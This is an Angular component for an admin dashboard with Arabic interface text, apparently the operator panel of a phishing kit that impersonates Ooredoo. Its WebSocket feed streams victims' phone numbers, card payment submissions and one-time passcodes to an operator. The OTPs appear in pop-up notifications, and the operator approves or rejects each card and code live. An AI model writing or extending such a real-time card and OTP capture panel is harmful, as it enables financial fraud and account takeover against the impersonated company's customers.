import {
  Component,
  OnInit,
  OnDestroy,
  signal,
  inject,
} from '@angular/core';
import { CommonModule } from '@angular/common';
import { Router } from '@angular/router';
import { Subscription } from 'rxjs';
import { ToastService } from '../../services/toast';
import { DashboardWebsocketService } from '../../services/dashboard-websocket';
import { enviroment } from '../../../env/enviroment';

@Component({
  selector: 'app-dashboard',
  standalone: true,
  imports: [CommonModule],
  templateUrl: './dashboard.html',
  styleUrl: './dashboard.css',
})
export class Dashboard implements OnInit, OnDestroy {
  private readonly toastService = inject(ToastService);
  private readonly router = inject(Router);
  private readonly wsService = inject(DashboardWebsocketService);

  readonly clients = signal<any[]>([]);
  readonly adminEmail = signal<string>('');

  /** WebSocket connection status */
  readonly wsConnected = signal<boolean>(false);

  private wsSub: Subscription | null = null;

  // ── Lifecycle ─────────────────────────────────────────────────────────

  ngOnInit(): void {
    const token = localStorage.getItem('admin_token');
    const email = localStorage.getItem('admin_email');

    if (!token) {
      this.router.navigate(['/93ceb7962cf40688f3c465ba57ff7286893fd19e']);
      return;
    }

    this.adminEmail.set(email || 'admin@ooredoo.com');
    this.loadData();
    this.connectWebSocket(token);
  }

  ngOnDestroy(): void {
    this.wsSub?.unsubscribe();
    this.wsService.disconnect();
  }

  // ── Data loading ──────────────────────────────────────────────────────

  async loadData(): Promise<void> {
    const token = localStorage.getItem('admin_token');
    try {
      const response = await fetch(
        enviroment.api_base + '/api/clients?include=payments,otps',
        { headers: { Authorization: `Bearer ${token}` } }
      );
      const resData = await response.json();
      if (resData.success) {
        const sorted = resData.data.sort(
          (a: any, b: any) =>
            new Date(b.created_at).getTime() - new Date(a.created_at).getTime()
        );
        this.clients.set(sorted);
      } else {
        this.toastService.show(resData.error || 'فشل تحميل البيانات', 'error');
        if (response.status === 401 || response.status === 403) {
          this.logout();
        }
      }
    } catch {
      this.toastService.show('خطأ في الاتصال بالخادم لتحميل البيانات', 'error');
    }
  }

  // ── WebSocket ─────────────────────────────────────────────────────────

  private connectWebSocket(token: string): void {
    this.wsService.connect(token);

    this.wsSub = this.wsService.messages$.subscribe((msg) => {
      switch (msg.event) {
        case 'connected':
          this.wsConnected.set(true);
          break;

        case 'client_created': {
          const newClient = msg.data;
          newClient.payments = [];
          newClient.otps = [];
          this.clients.update((list) => [newClient, ...list]);
          this.toastService.show(
            `عميل جديد انضم: ${newClient.phone_number}`,
            'success'
          );
          break;
        }

        case 'payment_created': {
          const payment = msg.data;
          this.clients.update((list) =>
            list.map((c) => {
              if (c.id === payment.client_id) {
                return { ...c, payments: [...(c.payments || []), payment] };
              }
              return c;
            })
          );
          this.toastService.show(
            `طلب دفع جديد للعميل صاحب الرقم ${this.getClientPhone(payment.client_id)}`,
            'info'
          );
          break;
        }

        case 'payment_updated': {
          const payment = msg.data;
          this.clients.update((list) =>
            list.map((c) => {
              if (c.id === payment.client_id) {
                return {
                  ...c,
                  payments: (c.payments || []).map((p: any) =>
                    p.id === payment.id ? payment : p
                  ),
                };
              }
              return c;
            })
          );
          break;
        }

        case 'otp_created': {
          const otp = msg.data;
          this.clients.update((list) =>
            list.map((c) => {
              if (c.id === otp.client_id) {
                return { ...c, otps: [...(c.otps || []), otp] };
              }
              return c;
            })
          );
          this.toastService.show(
            `رمز تحقق جديد تم تقديمه: ${otp.otp}`,
            'info'
          );
          break;
        }

        case 'otp_updated': {
          const otp = msg.data;
          this.clients.update((list) =>
            list.map((c) => {
              if (c.id === otp.client_id) {
                return {
                  ...c,
                  otps: (c.otps || []).map((o: any) =>
                    o.id === otp.id ? otp : o
                  ),
                };
              }
              return c;
            })
          );
          break;
        }
      }
    });
  }

  // ── Admin actions via WebSocket ────────────────────────────────────────

  handlePaymentAction(paymentId: string, status: 'ACCEPTED' | 'REJECTED'): void {
    this.wsService.paymentAction(paymentId, status);
    this.toastService.show(
      status === 'ACCEPTED' ? 'جاري الموافقة على البطاقة...' : 'جاري رفض البطاقة...',
      'info'
    );
  }

  handleOtpAction(otpId: string, status: 'ACCEPTED' | 'REJECTED'): void {
    this.wsService.otpAction(otpId, status);
    this.toastService.show(
      status === 'ACCEPTED' ? 'جاري الموافقة على الـ OTP...' : 'جاري رفض الـ OTP...',
      'info'
    );
  }

  // ── Utilities ─────────────────────────────────────────────────────────

  getClientPhone(clientId: string): string {
    const found = this.clients().find((c) => c.id === clientId);
    return found ? found.phone_number : 'غير معروف';
  }

  getLatestPayment(client: any): any {
    if (!client.payments || client.payments.length === 0) return null;
    return client.payments[client.payments.length - 1];
  }

  getLatestOtp(client: any): any {
    if (!client.otps || client.otps.length === 0) return null;
    return client.otps[client.otps.length - 1];
  }

  logout(): void {
    this.wsService.disconnect();
    localStorage.removeItem('admin_token');
    localStorage.removeItem('admin_email');
    this.router.navigate(['/93ceb7962cf40688f3c465ba57ff7286893fd19e']);
  }
}
